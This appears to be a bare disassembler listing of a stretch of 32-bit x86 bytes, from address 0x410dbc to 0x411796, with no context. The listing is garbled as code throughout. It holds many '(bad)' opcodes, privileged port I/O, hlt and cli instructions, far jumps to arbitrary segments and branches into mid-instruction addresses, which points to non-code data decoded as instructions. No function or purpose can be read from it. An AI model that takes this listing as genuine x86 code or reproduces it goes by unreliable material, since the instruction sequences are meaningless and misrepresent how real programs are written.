  410dbc:	outs   dx,BYTE PTR ds:[esi]
  410dbd:	mov    WORD PTR [ebp+0x2b82ad66],?
  410dc3:	cmc    
  410dc4:	outs   dx,DWORD PTR ds:[esi]
  410dc5:	(bad)  
  410dc6:	xchg   edx,eax
  410dc7:	(bad)  [ecx-0x780b6238]
  410dcd:	(bad)  
  410dce:	call   0x2a9f2921
	...
  410deb:	add    BYTE PTR [ebp-0x501976f4],ch
  410df1:	inc    edi
  410df2:	imul   esi,ebp,0xaa74849f
  410df8:	imul   DWORD PTR [esp+eiz*2+0x49]
  410dfc:	cmc    
  410dfd:	add    al,0x33
  410dff:	not    ebp
  410e01:	fsincos 
  410e03:	jb     0x410db7
  410e05:	and    BYTE PTR [ebx],al
  410e07:	stos   DWORD PTR es:[edi],eax
  410e08:	(bad)  
  410e09:	fwait
  410e0a:	inc    edi
  410e0b:	std    
  410e0c:	or     al,0xd0
  410e0e:	add    cl,dh
  410e10:	jle    0x410dad
  410e12:	aas    
  410e13:	add    BYTE PTR [ebx+0x29c08366],cl
  410e19:	sub    al,0x6a
  410e1b:	add    al,BYTE PTR [edx]
  410e1d:	addr16 cmp eax,edi
  410e20:	push   ds
  410e21:	adc    al,0x8b
  410e23:	jno    0x410dd6
  410e25:	or     esi,edx
  410e27:	mov    eax,ebp
  410e29:	in     al,0xfd
  410e2b:	jno    0x410e32
  410e2d:	aaa    
  410e2e:	std    
  410e2f:	adc    eax,0x3ffaf1
  410e34:	enter  0x72c8,0x5
  410e38:	outs   dx,BYTE PTR ds:[esi]
  410e39:	(bad)  
  410e3a:	xchg   DWORD PTR [ebp+0x79],esi
  410e3d:	mov    WORD PTR [ebx-0x4],cs
  410e40:	xchg   edx,eax
  410e41:	jecxz  0x410e07
  410e43:	jmp    0x410e65
  410e45:	sbb    eax,eax
  410e47:	inc    eax
  410e48:	fsubrp st(3),st
  410e4a:	arpl   ax,bp
  410e4c:	sahf   
  410e4d:	popf   
  410e4e:	cli    
  410e4f:	inc    DWORD PTR [eax]
	...
  410e69:	fmulp  st(0),st
  410e6b:	out    0x48,al
  410e6d:	ins    DWORD PTR es:[edi],dx
  410e6e:	or     eax,DWORD PTR [eax]
  410e70:	ret    
  410e71:	(bad)  
  410e72:	mul    DWORD PTR [edi-0x70]
  410e75:	test   al,0x4a
  410e77:	(bad)  
  410e78:	out    0xcd,eax
  410e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e7b:	add    BYTE PTR [eax],al
  410e7d:	inc    si
  410e7f:	push   cs
  410e80:	mov    ebp,edi
  410e82:	jecxz  0x410eff
  410e84:	or     BYTE PTR [esi+0x66],bl
  410e87:	cli    
  410e88:	add    BYTE PTR [esi+0x3a],dl
  410e8b:	cmp    al,BYTE PTR [ebx+0xa26331]
  410e91:	popf   
  410e92:	pop    es
  410e93:	add    BYTE PTR [edi],cl
  410e95:	sbb    DWORD PTR [edi-0x1d720002],ecx
  410e9b:	call   0x400:0x76d0a
  410ea2:	dec    ebp
  410ea3:	push   cs
  410ea4:	test   esp,esi
  410ea6:	xchg   esi,eax
  410ea7:	stc    
  410ea8:	xor    DWORD PTR [eax+0x6d],0x2
  410eac:	add    BYTE PTR [edi+0x28],ch
  410eaf:	clc    
  410eb0:	add    cl,BYTE PTR [ebp-0x2c]
  410eb3:	mov    DWORD PTR [edi],0xf7033979
  410eb9:	cmp    al,0x36
  410ebb:	inc    edx
  410ebc:	and    dh,BYTE PTR [edi]
  410ebe:	(bad)  
  410ebf:	into   
  410ec0:	or     DWORD PTR [eax],ecx
  410ec2:	aaa    
  410ec3:	je     0x410eef
  410ec5:	dec    esi
  410ec6:	in     al,0xe7
  410ec8:	or     ebp,DWORD PTR [edi+0x30]
  410ecb:	adc    al,0x3
	...
  410ee5:	add    BYTE PTR ds:0x77dfc7d4,bl
  410eeb:	inc    esi
  410eec:	add    dh,BYTE PTR [eax+eax*8-0x1a]
  410ef0:	aad    0x3
  410ef2:	ja     0x410ecb
  410ef4:	cli    
  410ef5:	jno    0x410eaa
  410ef7:	fsubr  st,st(4)
  410ef9:	mul    DWORD PTR ds:0xe47c7bd2
  410eff:	out    dx,al
  410f00:	(bad)  
  410f02:	hlt    
  410f03:	out    0xcf,al
  410f05:	jecxz  0x410ec6
  410f07:	add    dh,dh
  410f09:	xor    eax,DWORD PTR [ebx]
  410f0b:	fcmovne st,st(6)
  410f0d:	push   edx
  410f0e:	cld    
  410f0f:	push   ecx
  410f10:	jg     0x410ee3
  410f12:	push   0xdbe18509
  410f17:	pop    ebx
  410f18:	add    al,BYTE PTR [eax]
  410f1a:	neg    DWORD PTR [esi+0x5]
  410f1d:	ror    DWORD PTR [edi],1
  410f1f:	mov    eax,ds:0xe8ea71fa
  410f24:	inc    edx
  410f25:	jae    0x410f17
  410f27:	inc    esi
  410f28:	push   edx
  410f29:	jbe    0x410f2d
  410f2b:	xlat   BYTE PTR ds:[ebx]
  410f2c:	out    0xb,eax
  410f2e:	fst    QWORD PTR [ebp+0x71f7397d]
  410f34:	jp     0x410f6f
  410f36:	outs   dx,DWORD PTR ds:[esi]
  410f37:	add    eax,0xc8931464
  410f3c:	les    ebx,FWORD PTR [ebp-0x50]
  410f3f:	push   es
  410f40:	xor    al,BYTE PTR [eax]
  410f42:	(bad)
  410f46:	jg     0x410faa
  410f48:	js     0x410f4d
	...
  410f62:	add    BYTE PTR [edi+0x10],bl
  410f65:	cli    
  410f66:	inc    ebx
  410f67:	sub    eax,DWORD PTR [esi+0x61]
  410f6a:	fistp  WORD PTR [ebx-0x7a]
  410f6d:	sbb    ebp,DWORD PTR [eax+0x5a]
  410f70:	pop    ss
  410f71:	test   eax,0xea81c85c
  410f76:	add    esi,DWORD PTR [esi]
  410f78:	adc    ecx,ebp
  410f7a:	fucom  st(7)
  410f7c:	in     al,dx
  410f7d:	test   al,0xef
  410f7f:	mov    dh,0x4
  410f81:	xchg   ecx,eax
  410f82:	sbb    eax,0x7ce90793
  410f87:	and    al,0x16
  410f89:	xchg   edx,eax
  410f8a:	jnp    0x410f4c
  410f8c:	pusha  
  410f8d:	popa   
  410f8e:	ret    0x8ddf
  410f91:	in     al,0x33
  410f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f94:	mov    WORD PTR [ebx-0x3f3b62a0],?
  410f9a:	add    eax,esp
  410f9c:	add    al,0xe9
  410f9e:	shl    BYTE PTR [esi-0xd04449f],1
  410fa4:	div    DWORD PTR [ebp+edx*1-0x409ffacc]
  410fab:	ret    
  410fac:	sbb    eax,0xba3ef02a
  410fb1:	mov    esi,0xe7adda5b
  410fb6:	add    edi,DWORD PTR [edi+0x4c]
  410fb9:	pop    edi
  410fba:	mov    bh,0x9f
  410fbc:	sbb    eax,0xb604f022
  410fc1:	cdq    
  410fc2:	sar    DWORD PTR [esi-0x49],1
  410fc5:	or     BYTE PTR [eax+eax*1+0x0],bl
	...
  410fdd:	add    BYTE PTR [eax],al
  410fdf:	add    ch,cl
  410fe1:	(bad)  
  410fe2:	push   ebp
  410fe4:	or     al,0x86
  410fe6:	mov    edi,0x56b5e975
  410feb:	out    0xa2,al
  410fed:	cmp    eax,0x631054fe
  410ff2:	je     0x410fd5
  410ff4:	or     al,0xf9
  410ff6:	imul   edi,ebx,0xffffffb7
  410ff9:	popa   
  410ffa:	cmc    
  410ffb:	mov    eax,ds:0xa1f64500
  411000:	out    dx,eax
  411001:	enter  0xb6e6,0x52
  411005:	cmp    eax,0x478eee7
  41100a:	add    cl,ah
  41100c:	cmp    ch,BYTE PTR [edx+0x74]
  41100f:	hlt    
  411010:	das    
  411011:	popa   
  411012:	jle    0x410ffd
  411014:	div    DWORD PTR [ebp+0x62d014fe]
  41101a:	je     0x41100d
  41101c:	pushf  
  41101d:	clc    
  41101e:	ja     0x410ffb
  411020:	aaa    
  411021:	popa   
  411022:	xchg   DWORD PTR [eax+ebx*4],edx
  411025:	xchg   BYTE PTR [ebp+ebp*2-0x74],cl
  411029:	mov    es,WORD PTR [ecx+ecx*2-0x50]
  41102d:	adc    BYTE PTR [ebx],dh
  41102f:	sub    DWORD PTR [edi],esi
  411031:	inc    esi
  411032:	mov    cl,ah
  411034:	lahf   
  411035:	xchg   BYTE PTR [ebp+ecx*2-0x74],cl
  411039:	push   ss
  41103a:	rcl    BYTE PTR [ecx+0x35],0x82
  41103e:	add    ecx,ebp
  411040:	xor    DWORD PTR [eax+eax*1],eax
  411043:	ret    
	...
  41105c:	add    bh,ch
  41105e:	in     al,dx
  41105f:	jg     0x411015
  411061:	mov    al,0x60
  411063:	out    0xa5,al
  411065:	jge    0x41106d
  411067:	add    BYTE PTR [edx+0x5e],dh
  41106a:	and    DWORD PTR [ebp+edx*1-0x9],0xffffff8b
  41106f:	inc    esi
  411070:	int    0xf0
  411072:	inc    edi
  411073:	add    BYTE PTR [eax],0x5
  411076:	test   BYTE PTR [ecx+0x72d61030],cl
  41107c:	popa   
  41107d:	push   cs
  41107e:	ins    BYTE PTR es:[edi],dx
  41107f:	add    dl,BYTE PTR [ebx+eiz*1]
  411082:	push   ecx
  411083:	add    edi,esi
  411085:	add    al,0x56
  411087:	(bad)  
  411088:	sub    ebx,0x8
  41108b:	je     0x4110de
  41108d:	push   ss
  41108e:	lahf   
  41108f:	or     al,BYTE PTR [ebx]
  411091:	push   edx
  411092:	cmp    ebp,edi
  411094:	push   ebp
  411095:	gs loope 0x4110db
  411098:	loopne 0x41106a
  41109a:	enter  0x5072,0xd6
  41109e:	push   es
  41109f:	add    ebx,edi
  4110a1:	(bad)  
  4110a2:	sahf   
  4110a3:	push   cs
  4110a4:	add    esp,DWORD PTR [edx-0x3b1bbc1e]
  4110aa:	dec    ebp
  4110ab:	fimul  DWORD PTR [ebx+0x74be854e]
  4110b1:	xor    dh,BYTE PTR [ecx+0x5]
  4110b4:	and    eax,0xfffee87a
  4110b9:	xchg   BYTE PTR [esi],al
  4110bb:	add    eax,edi
  4110bd:	mov    cs,eax
  4110bf:	add    BYTE PTR [eax+0x0],dl
	...
  4110da:	mov    dl,BYTE PTR [ebp-0x22]
  4110dd:	call   DWORD PTR [eax+0x58]
  4110e0:	add    eax,0x21
  4110e3:	mov    ecx,DWORD PTR es:[ebp-0x4f]
  4110e7:	loope  0x4110e8
  4110e9:	or     dh,0x4
  4110ec:	add    DWORD PTR [ebp+0x41],0x5
  4110f0:	jmp    0x4110c2
  4110f2:	pop    esi
  4110f3:	pop    ds
  4110f4:	adc    ebp,ebx
  4110f6:	jb     0x41107b
  4110f8:	dec    ebx
  4110f9:	cld    
  4110fa:	or     bl,BYTE PTR [ecx+0x12c8eaff]
  411100:	rol    BYTE PTR [eax+0x1e],0xdc
  411104:	arpl   ax,bp
  411106:	hlt    
  411107:	jmp    0xe742:0x3bbbfbb8
  41110e:	fsubr  st(7),st
  411110:	add    DWORD PTR [eax],eax
  411112:	mov    dh,0x55
  411114:	add    ch,BYTE PTR [edx-0x4]
  411117:	test   edx,esi
  411119:	je     0x411152
  41111b:	outs   dx,BYTE PTR ds:[esi]
  41111c:	pop    edx
  41111d:	fnsave [ecx+0x6b]
  411120:	add    dh,BYTE PTR [ebx]
  411122:	scas   eax,DWORD PTR es:[edi]
  411123:	aad    0xc7
  411125:	out    0x6d,al
  411127:	sbb    BYTE PTR [eax-0x76],ch
  41112a:	xor    eax,0xfc937b12
  41112f:	in     eax,dx
  411130:	add    al,BYTE PTR [eax]
  411132:	hlt    
  411133:	add    dl,BYTE PTR [ebx+0x75]
  411136:	(bad)  
  411137:	jmp    0x2:0x6d7007a6
	...
  411156:	add    al,ch
  411158:	(bad)  
  411159:	mov    ebp,0x7b54008c
  41115e:	je     0x41117c
  411160:	loop   0x41115e
  411162:	cmp    dh,BYTE PTR [edi]
  411164:	stc    
  411165:	sub    DWORD PTR [ebp+0x457955f0],ecx
  41116b:	add    al,0x6b
  41116d:	inc    ebx
  41116e:	mov    BYTE PTR [ecx+0x147c7b79],bh
  411174:	xchg   esp,eax
  411175:	add    eax,0xcfd2ec74
  41117a:	pop    es
  41117b:	iret   
  41117c:	pop    ebp
  41117d:	out    dx,eax
  41117e:	or     BYTE PTR [edi-0x60],ch
  411181:	test   BYTE PTR [eax-0x193fd81c],0xf5
  411188:	jmp    0xeaff:0x2c77033d
  41118f:	ret    0x3ceb
  411192:	adc    ecx,edi
  411194:	and    al,0x32
  411196:	shl    BYTE PTR [eax*1+0x6d507a2a],0x26
  41119e:	rcr    dl,0x5
  4111a1:	push   0xffffffb8
  4111a3:	mov    edi,0x9ac0625e
  4111a8:	ins    DWORD PTR es:[edi],dx
  4111a9:	dec    ebp
  4111aa:	mov    ch,dh
  4111ac:	add    al,0x2b
  4111ae:	sti    
  4111af:	mov    ds:0xd7ef61b8,eax
  4111b4:	or     al,0x96
  4111b6:	jp     0x411145
  4111b8:	mov    bh,BYTE PTR [eax]
  4111ba:	clc    
	...
  4111d3:	add    BYTE PTR [esi-0x7],bh
  4111d6:	call   0x6e71:0xe9ed1379
  4111dd:	mov    ch,0x3c
  4111df:	sbb    DWORD PTR [ebp+0x1a],eax
  4111e2:	ret    
  4111e3:	out    0xf7,al
  4111e5:	adc    DWORD PTR [ecx+0x2c570d59],ebp
  4111eb:	and    BYTE PTR [esp+eax*1],al
  4111ee:	sbb    dh,al
  4111f0:	add    eax,0xede6a588
  4111f5:	mov    DWORD PTR [eax],ebp
  4111f7:	xor    al,0xf
  4111f9:	push   esp
  4111fa:	in     eax,0xad
  4111fc:	fmul   QWORD PTR ds:0x8b021057
  411202:	in     al,0x0
  411204:	mov    ebx,0xf607c0c3
  411209:	xlat   BYTE PTR ds:[ebx]
  41120a:	(bad)  
  41120b:	jle    0x411227
  41120d:	fiadd  WORD PTR [ecx-0x3e3acbcf]
  411213:	les    ebp,FWORD PTR [ecx+0x6e03f042]
  411219:	hlt    
  41121a:	(bad)  
  41121b:	(bad)  
  41121c:	stos   BYTE PTR es:[edi],al
  41121d:	ret    
  41121e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41121f:	sub    DWORD PTR [esi-0x15811129],esi
  411225:	fnsave [edi]
  411227:	pop    ecx
  411228:	fst    DWORD PTR [ecx]
  41122a:	add    BYTE PTR [ecx],ch
  41122c:	cmp    eax,0x2c625469
  411231:	test   ebx,ebp
  411233:	std    
  411234:	test   BYTE PTR [eax+eax*1],0xba
	...
  411250:	add    BYTE PTR [ecx-0x57028b76],dh
  411256:	mov    bh,cl
  411258:	bound  edi,QWORD PTR [edi]
  41125a:	ins    DWORD PTR es:[edi],dx
  41125b:	sub    esp,esi
  41125d:	test   DWORD PTR [ebx+ecx*4],0x461a03a4
  411264:	loope  0x411206
  411266:	xor    BYTE PTR [ebx],0xce
  411269:	test   DWORD PTR [esi+esi*8],0x8b02d02c
  411270:	and    al,0xf0
  411272:	mov    eax,DWORD PTR [ecx+eax*8-0x75]
  411276:	push   cs
  411277:	mov    esp,DWORD PTR [esp+edi*8]
  41127a:	mov    eax,DWORD PTR [ecx+esi*4-0x1e]
  41127e:	enter  0x70c7,0x3a
  411282:	dec    ecx
  411283:	mov    BYTE PTR [esp+ebp*8],ch
  411286:	mov    cl,BYTE PTR [esi]
  411288:	push   0x32
  41128a:	ins    DWORD PTR es:[edi],dx
  41128b:	jmp    FWORD PTR [ecx+0x2a]
  41128e:	imul   edi,edi,0x884491ed
  411294:	sub    al,0xcc
  411296:	xor    bh,0x17
  411299:	sub    DWORD PTR [esi+0x4f7d0ac],eax
  41129f:	getsec 
  4112a1:	xchg   DWORD PTR [edx+0x5df02801],ebp
  4112a7:	and    edx,DWORD PTR [esp+esi*2+0x4]
  4112ab:	inc    ecx
  4112ac:	jmp    0xe887a9b1
  4112b1:	or     BYTE PTR [edi+0xeb4e],dl
	...
  4112cb:	add    BYTE PTR [eax],al
  4112cd:	add    BYTE PTR [esi+0x36e2073d],dh
  4112d3:	fdivr  QWORD PTR [esi+0x0]
  4112d6:	fidiv  WORD PTR ds:0x51c94587
  4112dc:	adc    DWORD PTR [ebp-0x7cfff733],0xffffffe0
  4112e3:	sbb    ch,ah
  4112e5:	inc    ebx
  4112e6:	fisttp QWORD PTR [eax]
  4112e8:	je     0x411b46
  4112ee:	shr    BYTE PTR [edx-0x6de9fbbb],cl
  4112f4:	push   0xffffff89
  4112f6:	pop    eax
  4112f7:	test   BYTE PTR [ecx+0x43df9146],cl
  4112fd:	mov    al,ds:0x2b669a16
  411302:	aad    0xde
  411304:	dec    ebx
  411305:	test   al,0x6
  411307:	ss push es
  411309:	sub    eax,DWORD PTR [ebp-0x76]
  41130c:	inc    ebx
  41130d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41130e:	adc    al,0x36
  411310:	stos   BYTE PTR es:[edi],al
  411311:	mov    edx,DWORD PTR [esi-0x14f037d4]
  411317:	dec    edi
  411318:	add    eax,ecx
  41131a:	sub    eax,0xdd4d8909
  41131f:	div    DWORD PTR [ebp-0x3ef4a4b1]
  411325:	bts    DWORD PTR [edi],esi
  411328:	push   es
  411329:	mov    DWORD PTR [eax],ebx
  41132b:	ror    DWORD PTR ds:0xc1100ab6,0xe0
	...
  41134a:	add    BYTE PTR ds:0xd889c10b,dl
  411350:	int3   
  411351:	mov    DWORD PTR [ebp+0x3d],eax
  411354:	fldcw  WORD PTR [ecx]
  411356:	ret    0xb97c
  411359:	xchg   DWORD PTR [ebp-0x37],eax
  41135c:	mov    eax,DWORD PTR [esp+eax*4-0x76fff7e3]
  411363:	pop    eax
  411364:	or     BYTE PTR [ecx+0x3d5f486],0x0
  41136b:	hlt    
  41136c:	mov    eax,0xa8b397d0
  411371:	jp     0x411373
  411373:	hlt    
  411374:	ins    DWORD PTR es:[edi],dx
  411375:	add    cl,BYTE PTR [ecx+0x1462d231]
  41137b:	add    al,0xc1
  41137d:	(bad)  
  41137e:	push   DWORD PTR [eax+0x2d]
  411381:	adc    ecx,DWORD PTR [edi+0x25761]
  411387:	jmp    0x41136e
  411389:	pop    ecx
  41138a:	daa    
  41138b:	hlt    
  41138c:	ins    DWORD PTR es:[edi],dx
  41138d:	test   esi,eax
  41138f:	repnz sar BYTE PTR [edx+0xe13f302],1
  411396:	mov    DWORD PTR [ecx],ebp
  411398:	pop    esi
  411399:	test   eax,edi
  41139b:	sbb    bh,BYTE PTR [ebx]
  41139d:	xchg   al,ch
  41139f:	cmc    
  4113a0:	ins    DWORD PTR es:[edi],dx
  4113a1:	add    al,BYTE PTR [ebx-0x7bed3d83]
  4113a7:	xchg   esp,eax
  4113a8:	ins    BYTE PTR es:[edi],dx
  4113a9:	add    al,BYTE PTR [eax]
  4113ab:	ja     0x4113e1
  4113ad:	out    0x73,al
	...
  4113c7:	add    bh,cl
  4113c9:	out    dx,al
  4113ca:	pop    ebx
  4113cb:	fs call 0xcd399ac4
  4113d1:	sbb    al,bh
  4113d3:	push   cs
  4113d4:	mov    ah,BYTE PTR [edx]
  4113d6:	add    eax,0x612820f
  4113db:	rcl    DWORD PTR [ebp+edx*2+0xd],0xc1
  4113e0:	div    DWORD PTR [ebp+0x6b]
  4113e3:	xor    ebp,0xb18b026d
  4113e9:	dec    ecx
  4113ea:	ret    0x8e4f
  4113ed:	ins    BYTE PTR es:[edi],dx
  4113ee:	in     al,dx
  4113ef:	call   FWORD PTR [edx]
  4113f1:	pop    eax
  4113f2:	cli    
  4113f3:	mov    bh,BYTE PTR [edi]
  4113f5:	repz bound esi,QWORD PTR [esp+eiz*8+0x4]
  4113fa:	data16 fsubr st,st(7)
  4113fd:	pop    ebx
  4113fe:	ror    DWORD PTR [ebx],cl
  411400:	or     al,0x74
  411402:	push   esi
  411403:	(bad)
  411408:	sti    
  411409:	or     BYTE PTR [esi+0x635ae3ff],0x43
  411410:	addr16 push cs
  411412:	hlt    
  411413:	add    eax,edx
  411415:	pop    edx
  411416:	sub    eax,0xd0857112
  41141b:	add    esi,esp
  41141d:	add    eax,0xc0ccf79c
  411422:	out    0x3,eax
  411424:	hlt    
  411425:	or     DWORD PTR [edi-0x36],edx
  411428:	test   DWORD PTR [ecx],0xba3f
	...
  411442:	add    BYTE PTR [eax],al
  411444:	add    al,bh
  411446:	inc    ebx
  411447:	or     BYTE PTR [ebx],cl
  411449:	out    dx,eax
  41144a:	inc    esi
  41144b:	jmp    0xd900e293
  411450:	loopne 0x41144a
  411452:	lea    edi,[esi]
  411454:	adc    BYTE PTR [edi+0x19],dh
  411457:	imul   eax,DWORD PTR [ebx+ebp*8],0xffffff87
  41145b:	jne    0x411463
  41145d:	hlt    
  41145e:	add    al,0x6a
  411460:	out    0x67,eax
  411462:	add    eax,0x9d85b6a
  411467:	fs push es
  411469:	cmc    
  41146a:	add    al,0xe9
  41146c:	mov    ecx,es
  41146e:	sub    al,0x6a
  411470:	out    0xe7,eax
  411472:	add    al,0xb8
  411474:	pop    esp
  411475:	jbe    0x411452
  411477:	enter  0x6d03,0xc0
  41147b:	cwde   
  41147c:	mov    eax,eax
  41147e:	push   0x92fb260e
  411483:	out    0x10,eax
  411485:	push   0xffffffb4
  411487:	out    0x42,eax
  411489:	cmp    ecx,DWORD PTR ds:0x1eb9e200
  41148f:	inc    ebp
  411490:	jns    0x4114be
  411492:	cmc    
  411493:	add    dh,BYTE PTR [edi-0xabba625]
  411499:	push   0xc36013c1
  41149e:	ins    DWORD PTR es:[edi],dx
  41149f:	cmp    ah,BYTE PTR [edi+0x72ddd917]
  4114a5:	mov    ebx,0xa73af5
	...
  4114c2:	pop    ss
  4114c3:	or     cl,BYTE PTR [ebp+0x4f876]
  4114c9:	bound  esi,QWORD PTR [ebx+0x27ac886d]
  4114cf:	pop    ds
  4114d0:	inc    esi
  4114d1:	rcr    DWORD PTR [ebp+0x47ac8acd],1
  4114d7:	das    
  4114d8:	inc    esi
  4114d9:	lds    edi,FWORD PTR [esi-0x40]
  4114dc:	out    dx,eax
  4114dd:	push   0x38
  4114df:	add    al,0x50
  4114e1:	jb     0x411496
  4114e3:	ins    DWORD PTR es:[edi],dx
  4114e4:	sub    BYTE PTR [ecx],0xfa
  4114e7:	mov    ah,0xfe
  4114e9:	aam    0x93
  4114eb:	out    dx,eax
  4114ec:	aas    
  4114ed:	jmp    0xa9c5d130
  4114f2:	mov    ds:0xc8248b2d,al
  4114f7:	or     dh,BYTE PTR [esi+0x509304e8]
  4114fd:	call   0xf2484eb8
  411502:	mov    cl,0x6
  411504:	shl    dl,0x3a
  411507:	or     DWORD PTR [ebp-0x24],edi
  41150a:	js     0x4114bb
  41150c:	or     ebp,DWORD PTR [edx-0x1d]
  41150f:	xchg   bh,bh
  411511:	in     eax,dx
  411512:	push   0x4
  411514:	add    ch,cl
  411516:	test   DWORD PTR [ebp+0x1df79564],0x3c45004e
  411520:	mov    dl,0x8b
  411522:	rcl    ah,1
  411524:	std    
  411525:	inc    ebp
	...
  41153e:	add    BYTE PTR [ecx],dh
  411540:	mov    es,WORD PTR [ebx-0x10]
  411543:	xchg   esi,eax
  411544:	inc    edx
  411545:	adc    bh,BYTE PTR [ebx]
  411547:	push   ebx
  411548:	and    eax,0x4286577d
  41154d:	jmp    0x2945:0x89021d83
  411554:	mov    DWORD PTR [ebx-0x10],eax
  411557:	into   
  411558:	dec    esi
  411559:	and    cl,BYTE PTR [ecx-0x3f7e4b70]
  41155f:	fist   WORD PTR [ebp+edi*8+0x13e50975]
  411566:	fs ret 
  411568:	inc    esp
  411569:	(bad)  
  41156a:	pop    eax
  41156b:	mov    ah,0x7f
  41156d:	mov    esi,0x4b89cf75
  411572:	lock retf 0xff7e
  411576:	push   cs
  411577:	jecxz  0x4115c3
  411579:	inc    eax
  41157b:	in     eax,dx
  41157c:	or     ecx,DWORD PTR [ebx]
  41157e:	rcr    DWORD PTR [esi-0x52bac63c],0x37
  411585:	or     ecx,DWORD PTR [ebx+0x3c82f4cb]
  41158b:	or     al,0x1
  41158d:	jge    0x41177d
  411593:	fisubr WORD PTR [ebp-0xe]
  411596:	add    BYTE PTR [edx],bh
  411598:	dec    esi
  411599:	adc    cl,BYTE PTR [ebx+0x46395d10]
  41159f:	std    
  4115a0:	fs mov al,0xf
	...
  4115bb:	add    bl,al
  4115bd:	aas    
  4115be:	dec    DWORD PTR [esi]
  4115c0:	mov    ds:0x6dc10047,eax
  4115c5:	or     DWORD PTR [ebx],ecx
  4115c7:	shl    esp,0x6a
  4115ca:	pop    edx
  4115cb:	sub    BYTE PTR [ecx-0x128afc8f],0xed
  4115d2:	push   ds
  4115d3:	push   esp
  4115d4:	jmp    0x4115b6
  4115d6:	mov    ecx,0x816df402
  4115db:	(bad)  
  4115dc:	imul   edx
  4115de:	loopne 0x4115db
  4115e0:	xchg   edi,eax
  4115e1:	dec    esi
  4115e2:	xchg   DWORD PTR [eax+ebx*8+0x6d],edx
  4115e6:	add    cl,BYTE PTR [ebx+0x4fc40a39]
  4115ec:	pop    esi
  4115ed:	ins    BYTE PTR es:[edi],dx
  4115ee:	pop    ebp
  4115ef:	je     0x4115f1
  4115f1:	shl    DWORD PTR [esi],cl
  4115f3:	(bad)  
  4115f4:	popa   
  4115f5:	data16 mov ah,0xfe
  4115f8:	dec    ecx
  4115f9:	ds mov edx,ecx
  4115fc:	retf   
  4115fd:	nop
  4115fe:	push   cs
  4115ff:	dec    DWORD PTR [ecx+0x56]
  411602:	push   0xfffffff4
  411604:	mov    eax,0xace85ef6
  411609:	inc    edi
  41160a:	add    al,BYTE PTR [eax]
  41160c:	jg     0x4115dd
  41160e:	ja     0x41160f
  411610:	mov    ds:0xebd1876d,eax
  411615:	loope  0x41163b
  411617:	(bad)  
  411618:	xchg   ebx,eax
  411619:	dec    esi
  41161a:	or     eax,0xd6233b6
  41161f:	mov    dh,0x0
	...
  411639:	xor    ebp,DWORD PTR [ecx+0x43]
  41163c:	fucomip st,st(4)
  41163e:	push   edx
  41163f:	inc    ebx
  411640:	mov    BYTE PTR [ecx+0x6bff1f35],bh
  411646:	ins    DWORD PTR es:[edi],dx
  411647:	add    cl,BYTE PTR [edi]
  411649:	js     0x411681
  41164b:	add    eax,DWORD PTR [eax]
  41164d:	hlt    
  41164e:	add    al,dl
  411650:	add    eax,DWORD PTR [ebx]
  411652:	jmp    0x6481:0x6df4010c
  411659:	dec    eax
  41165a:	add    al,0xe9
  41165c:	cmp    BYTE PTR [eax+0x790f0554],0xd4
  411663:	xchg   ebp,eax
  411664:	pop    esi
  411665:	sub    cl,BYTE PTR [ebx-0x1e88d3da]
  41166b:	fadd   QWORD PTR [ebx]
  41166d:	ja     0x411645
  41166f:	enter  0x7d03,0xc1
  411673:	test   ch,bl
  411675:	aad    0x7
  411677:	aaa    
  411678:	or     esi,ebx
  41167a:	mov    ?,WORD PTR [eax-0xf9acafc]
  411680:	or     bh,BYTE PTR [esi+0x675ba41a]
  411686:	hlt    
  411687:	jmp    0xab972e51
  41168c:	imul   DWORD PTR [esi-0x38]
  41168f:	aam    0x8c
  411691:	cmp    BYTE PTR [ecx-0xf],ch
  411694:	int    0xeb
  411696:	fmul   DWORD PTR [esi]
  411698:	mov    bh,BYTE PTR [eax]
  41169a:	icebp  
  41169b:	loope  0x411662
	...
  4116b5:	add    bl,bl
  4116b7:	add    eax,0x56b3116c
  4116bc:	adc    eax,0x5f69308a
  4116c1:	enter  0x1a93,0xaf
  4116c5:	sub    esp,DWORD PTR [edx]
  4116c7:	mov    esi,0x2aa3c871
  4116cc:	scas   eax,DWORD PTR es:[edi]
  4116cd:	daa    
  4116ce:	jge    0x411690
  4116d0:	clc    
  4116d1:	add    DWORD PTR [ebx+0x3],0x69308939
  4116d8:	imul   eax,DWORD PTR [ebp+esi*8-0x4c],0xeed7f7d5
  4116e0:	sub    BYTE PTR [edi*4-0x1fbb9445],al
  4116e7:	sbb    eax,0x663cf72
  4116ec:	add    BYTE PTR [edi+0x47],bh
  4116ef:	pop    es
  4116f0:	mov    dh,0x28
  4116f2:	test   DWORD PTR [ebx-0x1f],0x8a42ecf1
  4116f9:	ja     0x4116a7
  4116fb:	push   ebp
  4116fc:	(bad)  
  4116fd:	jmp    0x9644d9de
  411702:	loopne 0x4116fe
  411704:	mov    edi,0xf3c16f29
  411709:	hlt    
  41170a:	xor    ebx,DWORD PTR [ebx]
  41170c:	dec    esi
  41170d:	shl    DWORD PTR [eax],0x9d
  411710:	mov    ah,BYTE PTR [esp+eax*4]
  411713:	push   esi
  411714:	inc    esp
  411715:	std    
  411716:	outs   dx,BYTE PTR ds:[esi]
  411717:	shr    edi,0x72
	...
  411732:	add    BYTE PTR [ebx+0x17af3af1],bh
  411738:	push   es
  411739:	lea    esp,[edx]
  41173b:	inc    edx
  41173c:	push   edi
  41173d:	(bad)  
  41173e:	jb     0x4116f3
  411740:	imul   eax,DWORD PTR [edx+0x448bf629],0xefc07d45
  41174a:	jmp    0x8327:0xac8921b9
  411751:	mov    edi,0x745667eb
  411756:	add    eax,0xf763f149
  41175b:	mov    bh,0x55
  41175d:	push   edi
  41175e:	mov    al,ds:0x640e9572
  411763:	push   esi
  411764:	push   edi
  411765:	(bad)  
  411766:	idiv   BYTE PTR [eax+ecx*8-0x11]
  41176a:	fisubr WORD PTR [ecx-0x3c]
  41176d:	add    dh,dh
  41176f:	popa   
  411770:	or     al,0xc1
  411772:	enter  0x9ff,0xc1
  411776:	bound  edi,QWORD PTR [ecx+0x71]
  411779:	(bad)  
  41177a:	call   0x824176
  41177f:	dec    ecx
  411780:	mov    al,0xd6
  411782:	sbb    ebx,DWORD PTR [ebp-0x76ba78bf]
  411788:	cs adc eax,0x895d18ff
  41178e:	inc    ebp
  41178f:	cmp    esp,edi
  411791:	inc    ebp
  411792:	and    BYTE PTR [ecx],dl
  411794:	je     0x41177d
  411796:	jo     0x411798
	...
